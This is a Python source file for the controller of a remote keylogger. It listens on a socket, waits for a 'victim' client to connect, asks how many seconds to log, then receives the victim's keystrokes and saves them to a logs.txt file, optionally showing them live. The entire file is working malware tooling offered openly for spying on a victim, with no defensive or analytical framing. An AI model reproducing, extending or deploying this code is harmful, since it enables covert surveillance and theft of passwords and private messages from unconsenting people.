# -*- coding: utf-8 -*-
import socket
import sys
import os
import time
import select


BLUE = '\33[94m'
LightBlue = '\033[94m'
RED = '\033[91m'
WHITE = '\33[97m'
YELLOW = '\33[93m'
GREEN = '\033[32m'
LightCyan    = "\033[96m"
END = '\033[0m'
ERASE_LINE = '\x1b[2K'
#------------------------
IP = sys.argv[2]
PORT = int(sys.argv[1])
#------------------------
nums = "123456789"

class Keylogger():

    def __init__(self):
        self.conn = ""
        self.server_sock = ""

    def Get_Connection(self):
        SERVER_ADD = (IP, PORT)
        server_socket = socket.socket()
        server_socket.bind(SERVER_ADD)
        server_socket.listen(1)
        client_sock, client_add = server_socket.accept()
        self.conn = client_sock
        self.server_sock = server_socket

    def str_to_raw(self, s):
        raw_map = {8: r'\b', 7: r'\a', 12: r'\f', 10: r'\n', 13: r'\r', 9: r'\t', 11: r'\v'}
        return r''.join(i if ord(i) > 32 else raw_map.get(ord(i), i) for i in s)

    def Get_Rid_Of_End_Spaces(self, cmd):
        cnt = -1
        while cmd[cnt] == " ":
            cnt -= 1
        if (cnt == -1):
            return cmd
        print("yes")
        return cmd[:cnt + 1]

    def Loading(self, str1):
        sys.stdout.write(str1)
        for x in range(10):
            sys.stdout.write(RED + "." + END)
            time.sleep(0.5)
            if(x %3 == 0):
                sys.stdout.write(ERASE_LINE + '\r' + str1)

    def KeyLogging(self):
      os.system("clear || cls")
      print(RED + "[" + BLUE + "?" + RED + "]" + WHITE + "How many time do you want to keylogg the victim?" + END)
      while True:
        try:
            t = input(RED + "Enter the time(in seconds): ")
            break
        except:
            print "Invalid Input"




      print(RED + "[" + BLUE + "?" + RED + "]" + WHITE + "Where would you like to save to log text file?" + END)
      dirc = raw_input(RED + "Enter a location: " + END)
      dirc =  self.Get_Rid_Of_End_Spaces(dirc)
      dirc = self.str_to_raw(dirc)
      while(os.path.exists(dirc + "\\" + "logs.txt") ==  True):
        print(RED + "[!]" + "There is a log file in this location already, Please choose a different location" + END)
        dirc = raw_input(RED + "Enter a location: " + END)
      if(dirc[-1] == " "):
          dirc = dirc[:-1]
      f = open(dirc + "\\" + "logs.txt", "w")

      print(RED + "[" + BLUE + "?" + RED + "]" + WHITE + "Do you want to see the loging in this screen too?[Y/N]" + END)
      answ = raw_input(RED + "Your answer: " + END)
      print(GREEN + "Sweet! the loging is about to start!" + END)
      time.sleep(2)
      os.system("clear || cls")
      print(RED + "Logging the victim!" + END)
      if(answ == "Y" or answ == "y"):
        sys.stdout.write(BLUE + "The victims keybord live activety: " + END)

      self.conn.send(str(t))
      t1 = time.time()
      while(True):
        t2 = time.time()
        if(t2-t1 >=int(t)):
                break
        ready = select.select([self.conn], [], [], 0.1)#wait until data is available or until the timeout occurs
        if ready[0]:
          key = self.conn.recv(1024)
        else:
          key = ""
        if(answ == "Y" or answ == "y"):
          sys.stdout.write(WHITE + key + END)
        f.write(key)
      f.close()
      print("")
      print RED + "DONE, Exitting the logging panel..." + END
      time.sleep(2)






    def Menu(self):
      while True:
        os.system("clear || cls")
        sys.stdout.write(RED + """
 __  __                        
|  \/  |   ___   _ __    _   _ 
| |\/| |  / _ \ | '_ \  | | | |
| |  | | |  __/ | | | | | |_| |
|_|  |_|  \___| |_| |_|  \__,_|
                                    
        """ + END + "\n")
        time.sleep(1)
        Info = self.conn.recv(1024)
        print Info
        ans = str(raw_input(RED + "[" + BLUE + "?" + RED + "]" + WHITE + " Your choise: " + END))
        while(ans != str(1)):
          print("Invalid key! Please choose a valid key!")
          ans = str(raw_input(RED + "[" + BLUE + "?" + RED + "]" + WHITE + " Your choise: " + END))
        self.conn.send(str(ans))
        self.KeyLogging()
        os.system("clear || cls")
        print RED + "[" + BLUE + "?" + RED + "]" + WHITE + "Do you want to go back to the Menu or exit?[Press N - for exit, Press any other key for the Menu]" + END
        ans = raw_input(RED + "Your answer: " + END)
        self.conn.send(ans)
        if(ans == "N" or ans == "n"):
          break
        time.sleep(1)
        self.conn, client_add = self.server_sock.accept()










def main():

    keylogger_class = Keylogger()
    os.system("clear || cls")
    sys.stdout.write(RED + """
 _   __           _                             
| | / /          | |                            
| |/ /  ___ _   _| | ___   __ _  __ _  ___ _ __ 
|    \ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
| |\  \  __/ |_| | | (_) | (_| | (_| |  __/ |   
\_| \_/\___|\__, |_|\___/ \__, |\__, |\___|_|   
             __/ |         __/ | __/ |          
            |___/         |___/ |___/           """ + END)
    print("")
    time.sleep(1)
    print("")
    keylogger_class.Loading(RED + "Loading" + END)

    #----Warning for client response----"
    os.system("clear || cls")
    sys.stdout.write(RED + """
   __    __         _  _    _                  __                _    _                   _  _               _   
  / / /\ \ \  __ _ (_)| |_ (_) _ __    __ _   / _|  ___   _ __  | |_ | |__    ___    ___ | |(_)  ___  _ __  | |_ 
  \ \/  \/ / / _` || || __|| || '_ \  / _` | | |_  / _ \ | '__| | __|| '_ \  / _ \  / __|| || | / _ \| '_ \ | __|
   \  /\  / | (_| || || |_ | || | | || (_| | |  _|| (_) || |    | |_ | | | ||  __/ | (__ | || ||  __/| | | || |_ 
    \/  \/   \__,_||_| \__||_||_| |_| \__, | |_|   \___/ |_|     \__||_| |_| \___|  \___||_||_| \___||_| |_| \__|
                                      |___/                                                                      
    """ + '\n' + END)



    keylogger_class.Get_Connection()
    print(BLUE + "Client has been Connected! \n" + END)
    keylogger_class.Loading(RED + "Loading the Menu" + END)

    #----Menu----"
    keylogger_class.Menu()
    print(RED + "Bye!" + END)

main()